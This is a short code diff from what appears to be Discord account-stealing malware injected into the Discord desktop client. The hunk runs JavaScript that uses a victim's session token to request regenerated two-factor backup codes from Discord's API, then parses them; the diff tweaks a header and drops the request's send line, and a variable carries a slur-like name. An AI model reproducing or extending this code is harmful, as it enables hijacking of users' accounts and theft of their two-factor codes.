@@ -284,8 +284,7 @@ window.webContents.executeJavaScript(`
   var xmlHttp = new XMLHttpRequest();
   xmlHttp.open("POST", "https://discord.com/api/v8/users/@me/mfa/codes", false);
   xmlHttp.setRequestHeader('Content-Type', 'application/json');
-  xmlHttp.setRequestHeader("authorization", "${token}")
-  xmlHttp.send(JSON.stringify({\"password\":\"${newpassword}\",\"regenerate\":true}));
+  xmlHttp.setRequestHeader("Authorization", "${token}")
   xmlHttp.responseText`, !0).then((codes) => {
     var fieldo = [];
     var gayass = JSON.parse(codes)
